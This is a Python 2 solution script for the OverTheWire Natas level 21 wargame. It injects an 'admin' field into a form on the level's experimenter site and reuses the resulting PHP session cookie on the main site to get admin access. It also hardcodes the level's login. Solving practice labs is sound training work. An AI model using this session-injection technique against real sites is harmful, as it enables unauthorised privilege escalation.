import requests
import re


user_auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')
target = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=1'
target2 = 'http://natas21.natas.labs.overthewire.org/?debug=1'

payload = {'align':'center', 'fontsize':'100%', 'bgcolor':'white', 'submit':'update', 'admin':'1'}

for i in range(0,1):

# checking what responses are given:
#    response = requests.get(target, auth = user_auth)
#    print(response.cookies)
    #randomString = "".join(random.choice(chars) for _ in range(26))
    #randomString = 'g92d726k7oipbkatlhd5ro4h14'
    session = requests.Session()
    response = session.post(target, auth = user_auth, data = payload)
    tmpCookies = session.cookies['PHPSESSID']

    print "-"*100
    #debugMatch = re.search('DEBUG.+<br>', response.text)
    #print(debugMatch.group(0)),
    print response.text
    #debugMatch = re.search('value=.+<br>', response.text)
    #print(debugMatch.group(0))

    response2 = requests.get(target2, auth = user_auth, cookies = {'PHPSESSID':tmpCookies})
    print response2.text
